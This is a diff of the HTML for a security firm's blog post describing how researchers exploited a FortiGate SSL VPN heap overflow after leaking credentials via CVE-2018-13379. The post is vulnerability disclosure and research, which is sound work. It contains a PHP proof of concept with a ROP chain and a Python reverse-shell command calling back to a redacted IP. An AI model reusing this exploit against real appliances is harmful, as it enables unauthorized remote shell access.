 <p>Our first attempt is exploiting the pre-auth heap overflow. However, there is a fundamental defect of this vulnerability – It does not overflow Null bytes. In general, this is not a serious problem. The heap exploitation techniques nowadays should overcome this. However, we found it a disaster doing heap feng shui on Fortigate. There are several obstacles, making the heap unstable and hard to be controlled.</p>
 <ul>
-  <li>Single thread, single process, single allocator<br />
-  The web daemon handles multiple connection with <code class="highlighter-rouge">epoll()</code>, no multi-process or multi-thread, and the main process and libraries use the same heap, called JeMalloc. It means, all the memory allocations from all the operations of all the connections are on the same heap. Therefore, the heap is really messy.</li>
-  <li>Operations regularly triggered<br />
+  <li>Single thread, single process, single allocator
+  The web daemon handles multiple connection with <code class="language-plaintext highlighter-rouge">epoll()</code>, no multi-process or multi-thread, and the main process and libraries use the same heap, called JeMalloc. It means, all the memory allocations from all the operations of all the connections are on the same heap. Therefore, the heap is really messy.</li>
+  <li>Operations regularly triggered
   This interferes the heap but is uncontrollable. We cannot arrange the heap carefully because it would be destroyed.</li>
-  <li>Apache additional memory management. <br />
-  The memory won’t be <code class="highlighter-rouge">free()</code> until the connection ends. We cannot arrange the heap in a single connection. Actually this can be an effective mitigation for heap vulnerabilities especially for use-after-free.</li>
-  <li>JeMalloc<br />
+  <li>Apache additional memory management. 
+  The memory won’t be <code class="language-plaintext highlighter-rouge">free()</code> until the connection ends. We cannot arrange the heap in a single connection. Actually this can be an effective mitigation for heap vulnerabilities especially for use-after-free.</li>
+  <li>JeMalloc
   JeMalloc isolates meta data and user data, so it is hard to modify meta data and play with the heap management. Moreover, it centralizes small objects, which also limits our exploit.</li>
 </ul>
 
@@ -255,13 +637,13 @@ To trigger this overflow, we need to put our exploit on an HTTP server, and then
 
 <ul>
   <li>
-    <p>Gain authentication<br />
+    <p>Gain authentication
   We first use CVE-2018-13379 to leak the session file. The session file contains valuable information, such as username and plaintext password, which let us login easily.</p>
 
     <p><img src="/assets/img/blog/20190807/4.png" alt="" /></p>
   </li>
   <li>
-    <p>Get the shell<br />
+    <p>Get the shell
   After login, we can ask the SSL VPN to proxy the exploit on our malicious HTTP server, and then trigger the heap overflow.</p>
 
     <p>Due to the problems mentioned above, we need a nice target to overflow. We cannot control the heap carefully, but maybe we can find something <strong>regularly</strong> appears! It would be great if it is <strong>everywhere</strong>, and every time we trigger the bug, we can overflow it easily! However, it is a hard work to find such a target from this huge program, so we were stuck at that time … and we started to fuzz the server, trying to get something useful.</p>
@@ -271,7 +653,7 @@ To trigger this overflow, we need to put our exploit on an HTTP server, and then
     <p><img src="/assets/img/blog/20190807/5.png" alt="" /></p>
 
     <p>Here is the crash, and that’s why we love fuzzing! ;)</p>
-    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  Program received signal SIGSEGV, Segmentation fault.
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  Program received signal SIGSEGV, Segmentation fault.
   0x00007fb908d12a77 in SSL_do_handshake () from /fortidev4-x86_64/lib/libssl.so.1.1
   2: /x $rax = 0x41414141
   1: x/i $pc
@@ -279,7 +661,7 @@ To trigger this overflow, we need to put our exploit on an HTTP server, and then
   (gdb)
 </code></pre></div>    </div>
 
-    <p>The crash happened in <a href="https://github.com/openssl/openssl/blob/master/ssl/ssl_lib.c#L3716"><code class="highlighter-rouge">SSL_do_handshake()</code></a></p>
+    <p>The crash happened in <a href="https://github.com/openssl/openssl/blob/master/ssl/ssl_lib.c#L3716"><code class="language-plaintext highlighter-rouge">SSL_do_handshake()</code></a></p>
     <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kt">int</span> <span class="nf">SSL_do_handshake</span><span class="p">(</span><span class="n">SSL</span> <span class="o">*</span><span class="n">s</span><span class="p">)</span>
   <span class="p">{</span>
       <span class="c1">// ...</span>
@@ -300,9 +682,9 @@ To trigger this overflow, we need to put our exploit on an HTTP server, and then
       <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
   <span class="p">}</span>
 </code></pre></div>    </div>
-    <p>We overwrote the function table inside <a href="https://github.com/openssl/openssl/blob/master/ssl/ssl_locl.h#L1080"><code class="highlighter-rouge">struct SSL</code></a> called <a href="https://github.com/openssl/openssl/blob/master/ssl/ssl_locl.h#L1087">method</a>, so when the program trying to execute <code class="highlighter-rouge">s-&gt;method-&gt;ssl_renegotiate_check(s, 0);</code>, it crashed.</p>
+    <p>We overwrote the function table inside <a href="https://github.com/openssl/openssl/blob/master/ssl/ssl_locl.h#L1080"><code class="language-plaintext highlighter-rouge">struct SSL</code></a> called <a href="https://github.com/openssl/openssl/blob/master/ssl/ssl_locl.h#L1087">method</a>, so when the program trying to execute <code class="language-plaintext highlighter-rouge">s-&gt;method-&gt;ssl_renegotiate_check(s, 0);</code>, it crashed.</p>
 
-    <p>This is actually an ideal target of our exploit! The allocation of <code class="highlighter-rouge">struct SSL</code> can be triggered easily, and the size is just close to our JaveScript buffer, so it can be nearby our buffer with a regular offset! According to the code, we can see that <code class="highlighter-rouge">ret = s-&gt;handshake_func(s);</code> calls a function pointer, which a perfect choice to control the program flow. With this finding, our exploit strategy is clear.</p>
+    <p>This is actually an ideal target of our exploit! The allocation of <code class="language-plaintext highlighter-rouge">struct SSL</code> can be triggered easily, and the size is just close to our JaveScript buffer, so it can be nearby our buffer with a regular offset! According to the code, we can see that <code class="language-plaintext highlighter-rouge">ret = s-&gt;handshake_func(s);</code> calls a function pointer, which a perfect choice to control the program flow. With this finding, our exploit strategy is clear.</p>
 
     <p>We first <strong>spray</strong> the heap with SSL structure with lots of normal requests, and then overflow the SSL structure.</p>
 
@@ -310,7 +692,7 @@ To trigger this overflow, we need to put our exploit on an HTTP server, and then
 
     <p>Here we put our php PoC on an HTTP server:</p>
     <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="cp">&lt;?php</span>
-      <span class="k">function</span> <span class="nf">p64</span><span class="p">(</span><span class="nv">$address</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">function</span> <span class="n">p64</span><span class="p">(</span><span class="nv">$address</span><span class="p">)</span> <span class="p">{</span>
           <span class="nv">$low</span> <span class="o">=</span> <span class="nv">$address</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">;</span>
           <span class="nv">$high</span> <span class="o">=</span> <span class="nv">$address</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">;</span>
           <span class="k">return</span> <span class="nb">pack</span><span class="p">(</span><span class="s2">"II"</span><span class="p">,</span> <span class="nv">$low</span><span class="p">,</span> <span class="nv">$high</span><span class="p">);</span>
@@ -318,43 +700,43 @@ To trigger this overflow, we need to put our exploit on an HTTP server, and then
       <span class="nv">$junk</span> <span class="o">=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span>
       <span class="nv">$nop_func</span> <span class="o">=</span> <span class="mh">0x32FC078</span><span class="p">;</span>
 
-      <span class="nv">$gadget</span>  <span class="o">=</span> <span class="nx">p64</span><span class="p">(</span><span class="nv">$junk</span><span class="p">);</span>
-      <span class="nv">$gadget</span> <span class="o">.=</span> <span class="nx">p64</span><span class="p">(</span><span class="nv">$nop_func</span> <span class="o">-</span> <span class="mh">0x60</span><span class="p">);</span>
-      <span class="nv">$gadget</span> <span class="o">.=</span> <span class="nx">p64</span><span class="p">(</span><span class="nv">$junk</span><span class="p">);</span>
-      <span class="nv">$gadget</span> <span class="o">.=</span> <span class="nx">p64</span><span class="p">(</span><span class="mh">0x110FA1A</span><span class="p">);</span> <span class="c1">// # start here # pop r13 ; pop r14 ; pop rbp ; ret ;</span>
-      <span class="nv">$gadget</span> <span class="o">.=</span> <span class="nx">p64</span><span class="p">(</span><span class="nv">$junk</span><span class="p">);</span>
-      <span class="nv">$gadget</span> <span class="o">.=</span> <span class="nx">p64</span><span class="p">(</span><span class="nv">$junk</span><span class="p">);</span>
-      <span class="nv">$gadget</span> <span class="o">.=</span> <span class="nx">p64</span><span class="p">(</span><span class="mh">0x110fa15</span><span class="p">);</span> <span class="c1">// push rbx ; or byte [rbx+0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret ;</span>
-      <span class="nv">$gadget</span> <span class="o">.=</span> <span class="nx">p64</span><span class="p">(</span><span class="mh">0x1bed1f6</span><span class="p">);</span> <span class="c1">// pop rax ; ret ;</span>
-      <span class="nv">$gadget</span> <span class="o">.=</span> <span class="nx">p64</span><span class="p">(</span><span class="mh">0x58</span><span class="p">);</span>
-      <span class="nv">$gadget</span> <span class="o">.=</span> <span class="nx">p64</span><span class="p">(</span><span class="mh">0x04410f6</span><span class="p">);</span> <span class="c1">// add rdi, rax ; mov eax, dword [rdi] ; ret  ;</span>
-      <span class="nv">$gadget</span> <span class="o">.=</span> <span class="nx">p64</span><span class="p">(</span><span class="mh">0x1366639</span><span class="p">);</span> <span class="c1">// call system ;</span>
-      <span class="nv">$gadget</span> <span class="o">.=</span> <span class="s2">"python -c 'import socket,sys,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((sys.argv[1],12345));[os.dup2(s.fileno(),x) for x in range(3)];os.system(sys.argv[2]);' xx.xxx.xx.xx /bin/sh;"</span><span class="p">;</span>
+      <span class="nv">$gadget</span>  <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="nv">$junk</span><span class="p">);</span>
+      <span class="nv">$gadget</span> <span class="mf">.</span><span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="nv">$nop_func</span> <span class="o">-</span> <span class="mh">0x60</span><span class="p">);</span>
+      <span class="nv">$gadget</span> <span class="mf">.</span><span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="nv">$junk</span><span class="p">);</span>
+      <span class="nv">$gadget</span> <span class="mf">.</span><span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x110FA1A</span><span class="p">);</span> <span class="c1">// # start here # pop r13 ; pop r14 ; pop rbp ; ret ;</span>
+      <span class="nv">$gadget</span> <span class="mf">.</span><span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="nv">$junk</span><span class="p">);</span>
+      <span class="nv">$gadget</span> <span class="mf">.</span><span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="nv">$junk</span><span class="p">);</span>
+      <span class="nv">$gadget</span> <span class="mf">.</span><span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x110fa15</span><span class="p">);</span> <span class="c1">// push rbx ; or byte [rbx+0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret ;</span>
+      <span class="nv">$gadget</span> <span class="mf">.</span><span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x1bed1f6</span><span class="p">);</span> <span class="c1">// pop rax ; ret ;</span>
+      <span class="nv">$gadget</span> <span class="mf">.</span><span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x58</span><span class="p">);</span>
+      <span class="nv">$gadget</span> <span class="mf">.</span><span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x04410f6</span><span class="p">);</span> <span class="c1">// add rdi, rax ; mov eax, dword [rdi] ; ret  ;</span>
+      <span class="nv">$gadget</span> <span class="mf">.</span><span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x1366639</span><span class="p">);</span> <span class="c1">// call system ;</span>
+      <span class="nv">$gadget</span> <span class="mf">.</span><span class="o">=</span> <span class="s2">"python -c 'import socket,sys,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((sys.argv[1],12345));[os.dup2(s.fileno(),x) for x in range(3)];os.system(sys.argv[2]);' xx.xxx.xx.xx /bin/sh;"</span><span class="p">;</span>
 
       <span class="nv">$p</span>  <span class="o">=</span> <span class="nb">str_repeat</span><span class="p">(</span><span class="s1">'AAAAAAAA'</span><span class="p">,</span> <span class="mi">1024</span><span class="o">+</span><span class="mi">512</span><span class="o">-</span><span class="mi">4</span><span class="p">);</span> <span class="c1">// offset</span>
-      <span class="nv">$p</span> <span class="o">.=</span> <span class="nv">$gadget</span><span class="p">;</span>
-      <span class="nv">$p</span> <span class="o">.=</span> <span class="nb">str_repeat</span><span class="p">(</span><span class="s1">'A'</span><span class="p">,</span> <span class="mh">0x1000</span> <span class="o">-</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$gadget</span><span class="p">));</span>
-      <span class="nv">$p</span> <span class="o">.=</span> <span class="nv">$gadget</span><span class="p">;</span>
+      <span class="nv">$p</span> <span class="mf">.</span><span class="o">=</span> <span class="nv">$gadget</span><span class="p">;</span>
+      <span class="nv">$p</span> <span class="mf">.</span><span class="o">=</span> <span class="nb">str_repeat</span><span class="p">(</span><span class="s1">'A'</span><span class="p">,</span> <span class="mh">0x1000</span> <span class="o">-</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$gadget</span><span class="p">));</span>
+      <span class="nv">$p</span> <span class="mf">.</span><span class="o">=</span> <span class="nv">$gadget</span><span class="p">;</span>
   <span class="cp">?&gt;</span>
   <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"javascript:void(0);</span><span class="cp">&lt;?=</span><span class="nv">$p</span><span class="p">;</span><span class="cp">?&gt;</span><span class="s">"</span><span class="nt">&gt;</span>xxx<span class="nt">&lt;/a&gt;</span>
 </code></pre></div>    </div>
     <p>The PoC can be divided into three parts.</p>
     <ol>
       <li>
-        <p>Fake SSL structure<br />
- The SSL structure has a regular offset to our buffer, so we can forge it precisely. In order to avoid the crash, we set the <code class="highlighter-rouge">method</code> to a place containing a void function pointer. The parameter at this time is SSL structure itself <code class="highlighter-rouge">s</code>. However, there is only 8 bytes ahead of <code class="highlighter-rouge">method</code>. We cannot simply call <code class="highlighter-rouge">system("/bin/sh");</code> on the HTTP server, so this is not enough for our reverse shell command. Thanks to the huge binary, it is easy to find ROP gadgets. We found one useful for stack pivot:</p>
+        <p>Fake SSL structure
+ The SSL structure has a regular offset to our buffer, so we can forge it precisely. In order to avoid the crash, we set the <code class="language-plaintext highlighter-rouge">method</code> to a place containing a void function pointer. The parameter at this time is SSL structure itself <code class="language-plaintext highlighter-rouge">s</code>. However, there is only 8 bytes ahead of <code class="language-plaintext highlighter-rouge">method</code>. We cannot simply call <code class="language-plaintext highlighter-rouge">system("/bin/sh");</code> on the HTTP server, so this is not enough for our reverse shell command. Thanks to the huge binary, it is easy to find ROP gadgets. We found one useful for stack pivot:</p>
 
-        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> push rbx ; or byte [rbx+0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret ;
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> push rbx ; or byte [rbx+0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret ;
 </code></pre></div>        </div>
-        <p>So we set the <code class="highlighter-rouge">handshake_func</code> to this gadget, move the <code class="highlighter-rouge">rsp</code> to our SSL structure, and do further ROP attack.</p>
+        <p>So we set the <code class="language-plaintext highlighter-rouge">handshake_func</code> to this gadget, move the <code class="language-plaintext highlighter-rouge">rsp</code> to our SSL structure, and do further ROP attack.</p>
       </li>
-      <li>ROP chain<br />
- The ROP chain here is simple. We slightly move the <code class="highlighter-rouge">rdi</code> forward so there is enough space for our reverse shell command.</li>
-      <li>Overflow string<br />
+      <li>ROP chain
+ The ROP chain here is simple. We slightly move the <code class="language-plaintext highlighter-rouge">rdi</code> forward so there is enough space for our reverse shell command.</li>
+      <li>Overflow string
  Finally, we concatenates the overflow padding and exploit. Once we overflow an SSL structure, we get a shell.</li>
     </ol>
 
-    <p>Our exploit requires multiple attempts because we may overflow something important and make the program crash prior to the <code class="highlighter-rouge">SSL_do_handshake</code>. Anyway, the exploit is still stable thanks to the reliable watchdog of Fortigate. It only takes 1~2 minutes to get a reverse shell back.</p>
+    <p>Our exploit requires multiple attempts because we may overflow something important and make the program crash prior to the <code class="language-plaintext highlighter-rouge">SSL_do_handshake</code>. Anyway, the exploit is still stable thanks to the reliable watchdog of Fortigate. It only takes 1~2 minutes to get a reverse shell back.</p>
   </li>
 </ul>
 
@@ -373,113 +755,119 @@ To trigger this overflow, we need to put our exploit on an HTTP server, and then
 <p>Upgrade to FortiOS 5.4.11, 5.6.9, 6.0.5, 6.2.0 or above.</p>
 
 
-              </article>
-              <p class="sns-widgets">
-                Share this on <button class="appearance-none sns-widgets__button" id="sns-facebook" type="button">Facebook</button> or <button class="appearance-none sns-widgets__button" id="sns-twitter" type="button">Twitter</button>
-              </p>
-          
-              <div class="heading--side-lined">
-                About <span class="blog-author-photo" style="background-image: url(/assets/themes/devcore-v2/images/avatar/meh.jpg)"></span> <a href="/en/blog/author/meh" class="blog-author-name">Meh</a> 
-              </div>
-              <p class="blog-author-info">
-                I am a pwner.
-              </p>
-          
-              <div class="heading--side-lined">
-                Comments
-              </div>
-              <div class="blog-comments">
-                
-
-
-  <div id="disqus_thread"></div>
-<script type="text/javascript">
-    var disqus_developer = 1;
-    var disqus_shortname = 'd3vc0r3'; // required: replace example with your forum shortname
-    
-    /* * * DON'T EDIT BELOW THIS LINE * * */
-    (function() {
-        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-        dsq.src = 'https://' + disqus_shortname + '.disqus.com/embed.js';
-        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-    })();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-<a href="https://disqus.com" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>
-
-
-
-
-              </div>
+                    </div>
+                    <!-- 文章內容 -->
+                </div>
+            </article>
+            <!-- 文章 end -->
+        </section>
+        
+         <!-- 作者 -->
+        <section>
+            <div class="container article_footer">
+                <div class="author_info">
+                    <a href="/en/blog/author/meh">
+                        <div class="circle" style="background-image: url(/assets/img/avatar/orig/meh.png);"></div>
+                    </a>
+                    <div>
+                        <a class="author" href="/en/blog/author/meh">
+                            <h3>Meh</h3>
+                        </a>
+                        <span>Business Development Manager</span>
+                        <p>
+                            I am a pwner.
+                        </p>
+                    </div>
+                </div>
             </div>
-          </div>
+        </section>
+        
 
-
-
-
-
-
-</main>
-      <div class="container--wrapper">
-
-
-        <div class="contact-section container">
-          <h2 class="contact-section__title">
-            Put your defenses to the test with authentic attacks
-          </h2>
-          <a href="/en/contact/" class="home-contact__button button--dense">Contact us now</a>
-        </div>
-
-        <footer class="main-footer">
-          <div class="main-footer__about">
-            DEVCORE offers professional<br class="mobile-only" /><a href="/en/services/penetration-test" class="link">pentesting</a>, <a href="/en/services/red-team" class="link">red teaming</a>, <a href="/en/services/security-consulting" class="link">consulting</a>, and <a href="/en/services/security-training" class="link">training</a> services.<br />For <a href="/en/blog/" class="link">latest updates</a>, follow us on <a href="https://www.facebook.com/D3VC0RE" class="link" target="_blank">Facebook</a> or <a href="https://twitter.com/d3vc0r3" class="link" target="_blank">Twitter</a>.
-          </div>
-          <div class="main-footer__snses"><a href="https://www.facebook.com/D3VC0RE" class="main-footer__sns" target="_blank">
-                <svg class="icon-fb icon"><use xlink:href="#icon-fb" /></svg></a><a href="https://twitter.com/d3vc0r3" class="main-footer__sns" target="_blank">
-                <svg class="icon-twitter icon"><use xlink:href="#icon-twitter" /></svg></a>
-          </div>
-          <address class="main-footer__address">
-            <ul class="list--unstyled">
-              <li>
-                13F., No. 32, Sec. 3, Bade Rd., Songshan Dist., Taipei City 105608, Taiwan
-              </li>
-              <li>
-                contact@devco.re
-              </li>
-              <li>
-                +886-2-2577-0925
-              </li>
-            </ul>
-          </address><small class="main-footer__copyright"><a href="/" class="logo">DEVCORE</a>©2023 DEVCORE</small>
-        </footer>
-      </div>
     </div>
-    <script src="/assets/themes/devcore-v2/javascripts/webpack_bundle.js"></script>
 
+    <!-- footer -->
+    <footer>
+<div class="container footer">
+    <div class="logo">
+        <a href="/en/">
+            <img src="/images/logo.svg"/>
+        </a>
+        <div class="social">
+            <a href="https://www.facebook.com/D3VC0RE"><i class="icon facebook"></i></a>
+            <a href="https://twitter.com/d3vc0r3"><i class="icon twitter"></i></a>
+        </div>
+    </div>
 
+    <div class="column">
+        <h6 class="mobile_toggle">Services</h6>
+        <ul>
+            <li><a href="/en/services/red-team/">Red Team Assessment</a></li>
+            <li><a href="/en/services/penetration-test/">Penetration Testing</a></li>
+            <li><a href="/en/services/security-consulting/">Security Consulting</a></li>
+            <li><a href="/en/services/security-training/">Security Training</a></li>
+        </ul>
+    </div>
 
-  <script type="text/javascript">
-  var _gaq = _gaq || [];
-  _gaq.push(['_setAccount', 'UA-30830800-1']);
-  _gaq.push(['_trackPageview', location.pathname + location.search + location.hash]);
+    <div class="column">
+        <h6 class="mobile_toggle">Research</h6>
+        <ul>
+            <li><a href="/en/research/overview/">Overview</a></li>
+            <li><a href="/en/research/awards/">Competitions and Awards</a></li>
+            <li><a href="/en/research/bug-bounty/">Enterprise Vulnerability Reports</a></li>
+            <li><a href="/en/research/talks/">International Conferences</a></li>
+            <li><a href="/en/research/cve/">CVE List</a></li>
+        </ul>
+    </div>
 
-  (function() {
-    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
-    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
-    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
-  })();
-</script>
+    <div class="column">
+        <h6 class="mobile_toggle">Company</h6>
+        <ul>
+            <li><a href="/en/company/about/">Company Overview</a></li>
+            <li><a href="/en/company/our-team/">Team Members</a></li>
+            <li><a href="/en/company/history/">Achievements</a></li>
+            <li><a href="/en/company/csr/">Corporate Social Responsibility</a></li>
+            <li><a href="/en/company/jobs/">Job Opportunities</a></li>
+            <li><a href="/en/contact/">Contact</a></li>
+        </ul>
+    </div>
 
+    <div class="column">
+        <h6 class="mobile_toggle">News</h6>
+        <ul>
+            <li><a href="/en/blog/">Blog</a></li>
+            <li><a href="/en/media-kit/">Media Resources</a></li>
+        </ul>
+    </div>
 
+    <!-- divider 分隔線 -->
+    <div class="divider"></div>
 
+    <div class="copyright">
+        <div class="info">
+            <span>© 2023 DEVCORE <b class="line-block">All right reserved.</b></span>
+            <span><a href="/en/privacy-policy/">Privacy Policy</a></span>
+        </div>
+        <div class="lang">
+            <!-- <i class="icon translate"></i>
+            <select>
+                <option value="">Language</option>
+                <option value="">中文</option>
+                <option value="">English</option>
+            </select> -->
+            <span>Language :<a href="/">中文</a>|<a href="/en/">English</a></span>
+        </div>
+    </div>
 
-    <!-- Google Tag Manager (noscript) -->
-    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-K5B8NW"
-    height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
-    <!-- End Google Tag Manager (noscript) -->
-
-  </body>
+</div>
+    </footer>
+</body>
 </html>
+
+
+
+
+
+
 
 
 
